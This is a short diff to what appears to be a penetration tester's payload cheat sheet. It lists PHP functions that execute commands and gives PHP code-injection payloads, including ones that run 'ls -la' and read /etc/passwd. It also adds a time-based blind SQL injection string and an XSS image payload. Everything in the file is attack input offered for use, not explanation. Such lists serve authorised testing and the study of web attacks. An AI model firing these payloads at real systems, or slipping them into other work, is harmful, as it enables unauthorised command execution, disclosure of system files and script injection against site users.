@@ -1,4 +1,13 @@
-~ PHP CODE INJECTION ~ { system() passthru() exec() shell_exec() fopen() file_get_contents() readfile() fsockopen() }
+~PHP CODE INJECTION~ { system() passthru() exec() shell_exec() fopen() file_get_contents() readfile() fsockopen() }
 
 ${@print('test')}
 ${@system('ls -la')}
+<?php system('tail /etc/passwd'); ?>
+<?php system('cat /etc/passwd'); ?>
+
+~SQL injection~
+
+(select*from(select(sleep(5)))a)
+
+~XSS~
+<img src=xss onerror=alert(1)>
